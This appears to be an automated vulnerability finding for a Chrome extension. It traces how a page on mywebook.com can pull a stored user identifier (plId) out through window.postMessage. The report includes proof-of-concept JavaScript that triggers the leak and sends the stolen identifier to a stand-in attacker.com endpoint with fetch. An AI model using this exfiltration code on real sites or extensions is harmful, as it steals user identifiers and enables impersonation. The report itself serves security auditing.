# CoCo Analysis: pmdnlbnecibhnahdcenfjpinmffahfmg

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pmdnlbnecibhnahdcenfjpinmffahfmg/opgen_generated_files/bg.js
Line 1007: `avwgBg.plId = res.plId;`

CoCo referenced Line 751 and 1007 in bg.js, which shows storage retrieval flowing to plId.

**Code:**

```javascript
// Background script - Initialize plId from storage (bg.js lines 1005-1013)
chrome.storage.local.get('plId', function (res) {
	avwgBg.plId = res.plId; // ← Storage value retrieved
	if (!avwgBg.plId || avwgBg.plId.length !== 73) {
		avwgBg.plId = avwgBg.createPlId();
		chrome.storage.local.set({'plId': avwgBg.plId});
	}
	bgInit();
});

// Background script - Message handler (bg.js lines 1089-1095)
chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
	switch (msg.action) {
		case 'internalPlId':
			sendResponse({
				plId: avwgBg.plId // ← Storage value sent back
			});
			return true;
	}
});

// Content script - Message relay (cs_0.js lines 467-490)
// Injected only on https://www.mywebook.com/*
window.addEventListener("message", (event) => {
	if (event.source === window && event.data.reqId.length &&
	    event.data.src === "zzmsgMywebookPage") { // ← Webpage can trigger
		chrome.runtime.sendMessage({
			action: 'internalPlId',
			data: {}
		}, function (res) {
			window.postMessage({
				src: "zzmsgMywebookPlugin",
				reqId: event.data.reqId,
				data: res // ← plId from storage sent to webpage
			}, "*");
		});
	}
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** Window postMessage from webpage to content script

**Attack:**

```javascript
// From https://www.mywebook.com/* (where content script is injected):
window.postMessage({
	src: "zzmsgMywebookPage",
	reqId: "attacker-request-123"
}, "*");

// Listen for response with storage data
window.addEventListener("message", (event) => {
	if (event.data.src === "zzmsgMywebookPlugin") {
		console.log("Stolen plId:", event.data.data.plId);
		// Exfiltrate to attacker server
		fetch('https://attacker.com/log', {
			method: 'POST',
			body: JSON.stringify(event.data.data)
		});
	}
});
```

**Impact:** Complete storage exploitation chain - attacker on https://www.mywebook.com can retrieve the plId from chrome.storage.local via window.postMessage. The plId appears to be a user tracking identifier that gets sent to the backend server (avwgBg.CONST_APIURL). An attacker controlling the mywebook.com domain can steal this identifier and potentially impersonate the user in backend communications.
